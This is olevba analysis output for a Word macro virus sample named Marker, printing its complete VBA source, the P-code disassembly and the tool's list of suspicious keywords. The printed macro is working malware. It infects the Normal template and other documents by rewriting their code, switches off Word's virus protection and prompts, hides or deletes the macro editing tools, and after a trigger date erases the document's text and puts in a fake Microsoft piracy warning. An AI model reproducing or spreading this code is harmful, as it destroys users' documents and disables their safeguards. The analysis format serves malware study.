olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.cp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.cp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








































































Private Sub Document_Close()
On Error Resume Next
    Dim myDate As Date
    myDate = #7/23/00#
    Dim SaveDOC, SaveDOT, DI, NI As Boolean
    Dim ad, nt As Object
    Dim rixCode As String
    Const mmX = "M-M-x"
'Tarlac State University Sucks
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    DI = ad.CodeModule.Find(mmX, 1, 1, 10000, 10000)
    NI = nt.CodeModule.Find(mmX, 1, 1, 10000, 10000)
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
        If Date >= myDate Then
            With Selection
                .WholeStory
                .Delete Unit:=wdCharacter, Count:=1
                .TypeText Text:="Sorry, Microsoft has determined that this copy of MS Word is not licensed!"
                .TypeParagraph
                .TypeText Text:="It is illegal to use this product. You have been warned!!!!!"
                .TypeParagraph
                .TypeText Text:="Please use/buy an original licensed copy of this product. Thank you"
            End With
            ActiveDocument.Save
        End If
'AMA CLC Tarlac Sucks
'*********************************
    If (DI = True Xor NI = True) And _
       (ActiveDocument.SaveFormat = wdFormatDocument Or _
       ActiveDocument.SaveFormat = wdFormatTemplate) Then
'DOT
      If DI = True Then
        SaveDOT = NormalTemplate.Saved
        rixCode = ad.CodeModule.Lines(1, 75)
        rixCode = rixCode & vbCrLf & vbTab & "myDate=#" & makeMyDate & "#"
        rixCode = rixCode & vbCrLf & ad.CodeModule.Lines(77, ad.CodeModule.CountOfLines)
        rixCode = rixCode & vbCrLf & "' " & Format(Time, "HH.MM.SS-") & Format(Date, "mm.dd.yy")
        nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
        nt.CodeModule.AddFromString rixCode
        If SaveDOT = True Then NormalTemplate.Save
      End If
'STI Tarlac Sucks
'DOC
      If NI = True And DI = False Or ActiveDocument.Saved = False Then
        SaveDOC = ActiveDocument.Saved
        rixCode = nt.CodeModule.Lines(1, 75)
        rixCode = rixCode & vbCrLf & vbTab & "myDate=#" & makeMyDate & "#"
        rixCode = rixCode & vbCrLf & nt.CodeModule.Lines(77, nt.CodeModule.CountOfLines)
        rixCode = rixCode & vbCrLf & "' " & Format(Time, "HH.MM.SS-") & Format(Date, "mm.dd.yy")
        ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
        ad.CodeModule.AddFromString rixCode
        If SaveDOC = True Then ActiveDocument.Save
      End If
    End If
'All the rest sucks even more
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        .ConfirmConversions = False
        .SavePropertiesPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("Control Toolbox").Visible = False
    CommandBars("Control Toolbox").Enabled = False
    CommandBars("Control Toolbox").Protection = msoBarNoChangeVisible
    CommandBars("Control Toolbox").Protection = msoBarNoCustomize
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
End Sub

Private Function makeMyDate() As Date
    Dim dM, dD, dY As Integer
    Randomize
    dM = Int(Rnd() * 12) + 1
    dD = Int(Rnd() * 25) + 1
    dY = 2000
    makeMyDate = CDate(dM & "/" & dD & "/" & dY)
End Function



' 12.07.19-01.25.00


' 16.23.21-01.27.00


' 08.53.15-01.28.00


' 10.08.56-02.24.00


' 10.58.57-02.24.00


' 11.13.40-02.24.00


' 11.44.42-02.24.00


' 11.45.16-02.24.00


' 11.14.41-03.03.00


' 11.15.16-03.03.00


' 11.45.32-04.13.00


' 11.45.45-04.13.00


' 11.56.09-02.28.01

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.cp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12480 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' 	FuncDefn (Private Sub Document_Close())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	Dim 
' 	VarDefn myDate (As Date)
' Line #75:
' 	LitDate 0x0000 0x0000 0xEF40 0x40E1 
' 	St myDate 
' Line #76:
' 	Dim 
' 	VarDefn SaveDOC
' 	VarDefn SaveDOT
' 	VarDefn DI
' 	VarDefn NI (As Boolean)
' Line #77:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #78:
' 	Dim 
' 	VarDefn rixCode (As String)
' Line #79:
' 	Dim (Const) 
' 	LitStr 0x0005 "M-M-x"
' 	VarDefn mmX
' Line #80:
' 	QuoteRem 0x0000 0x001D "Tarlac State University Sucks"
' Line #81:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #82:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #83:
' 	Ld mmX 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #84:
' 	Ld mmX 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NI 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #87:
' 	Ld Date 
' 	Ld myDate 
' 	Ge 
' 	IfBlock 
' Line #88:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #89:
' 	ArgsMemCallWith WholeStory 0x0000 
' Line #90:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #91:
' 	LitStr 0x004A "Sorry, Microsoft has determined that this copy of MS Word is not licensed!"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #92:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #93:
' 	LitStr 0x003C "It is illegal to use this product. You have been warned!!!!!"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #94:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #95:
' 	LitStr 0x0043 "Please use/buy an original licensed copy of this product. Thank you"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #96:
' 	EndWith 
' Line #97:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	QuoteRem 0x0000 0x0014 "AMA CLC Tarlac Sucks"
' Line #100:
' 	QuoteRem 0x0000 0x0021 "*********************************"
' Line #101:
' 	LineCont 0x0008 0B 00 07 00 12 00 07 00
' 	Ld DI 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NI 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #102:
' 	QuoteRem 0x0000 0x0003 "DOT"
' Line #103:
' 	Ld DI 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #104:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveDOT 
' Line #105:
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St rixCode 
' Line #106:
' 	Ld rixCode 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	LitStr 0x0008 "myDate=#"
' 	Concat 
' 	Ld makeMyDate 
' 	Concat 
' 	LitStr 0x0001 "#"
' 	Concat 
' 	St rixCode 
' Line #107:
' 	Ld rixCode 
' 	Ld vbCrLf 
' 	Concat 
' 	LitDI2 0x004D 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St rixCode 
' Line #108:
' 	Ld rixCode 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0009 "HH.MM.SS-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0008 "mm.dd.yy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St rixCode 
' Line #109:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #110:
' 	Ld rixCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #111:
' 	Ld SaveDOT 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	QuoteRem 0x0000 0x0010 "STI Tarlac Sucks"
' Line #114:
' 	QuoteRem 0x0000 0x0003 "DOC"
' Line #115:
' 	Ld NI 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DI 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #116:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDOC 
' Line #117:
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St rixCode 
' Line #118:
' 	Ld rixCode 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	LitStr 0x0008 "myDate=#"
' 	Concat 
' 	Ld makeMyDate 
' 	Concat 
' 	LitStr 0x0001 "#"
' 	Concat 
' 	St rixCode 
' Line #119:
' 	Ld rixCode 
' 	Ld vbCrLf 
' 	Concat 
' 	LitDI2 0x004D 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St rixCode 
' Line #120:
' 	Ld rixCode 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0009 "HH.MM.SS-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0008 "mm.dd.yy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St rixCode 
' Line #121:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #122:
' 	Ld rixCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #123:
' 	Ld SaveDOC 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	QuoteRem 0x0000 0x001C "All the rest sucks even more"
' Line #127:
' 	EndSub 
' Line #128:
' Line #129:
' 	FuncDefn (Private Sub Document_Open())
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #132:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #133:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #134:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #135:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #136:
' 	EndWith 
' Line #137:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #138:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #139:
' 	EndWith 
' Line #140:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #141:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #142:
' 	LitVarSpecial (False)
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #143:
' 	LitVarSpecial (False)
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #144:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #145:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #146:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #147:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #148:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #149:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #150:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #151:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #152:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #153:
' 	EndSub 
' Line #154:
' Line #155:
' 	FuncDefn (Private Function makeMyDate(id_FFFE As Date) As Date)
' Line #156:
' 	Dim 
' 	VarDefn dM
' 	VarDefn dD
' 	VarDefn dY (As Integer)
' Line #157:
' 	ArgsCall Read 0x0000 
' Line #158:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St dM 
' Line #159:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St dD 
' Line #160:
' 	LitDI2 0x07D0 
' 	St dY 
' Line #161:
' 	Ld dM 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	Ld dD 
' 	Concat 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	Ld dY 
' 	Concat 
' 	Coerce (Date) 
' 	St makeMyDate 
' Line #162:
' 	EndFunc 
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' 	QuoteRem 0x0000 0x0012 " 12.07.19-01.25.00"
' Line #167:
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x0012 " 16.23.21-01.27.00"
' Line #170:
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x0012 " 08.53.15-01.28.00"
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0012 " 10.08.56-02.24.00"
' Line #176:
' Line #177:
' Line #178:
' 	QuoteRem 0x0000 0x0012 " 10.58.57-02.24.00"
' Line #179:
' Line #180:
' Line #181:
' 	QuoteRem 0x0000 0x0012 " 11.13.40-02.24.00"
' Line #182:
' Line #183:
' Line #184:
' 	QuoteRem 0x0000 0x0012 " 11.44.42-02.24.00"
' Line #185:
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x0012 " 11.45.16-02.24.00"
' Line #188:
' Line #189:
' Line #190:
' 	QuoteRem 0x0000 0x0012 " 11.14.41-03.03.00"
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x0012 " 11.15.16-03.03.00"
' Line #194:
' Line #195:
' Line #196:
' 	QuoteRem 0x0000 0x0012 " 11.45.32-04.13.00"
' Line #197:
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x0012 " 11.45.45-04.13.00"
' Line #200:
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x0012 " 11.56.09-02.28.01"
' Line #203:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

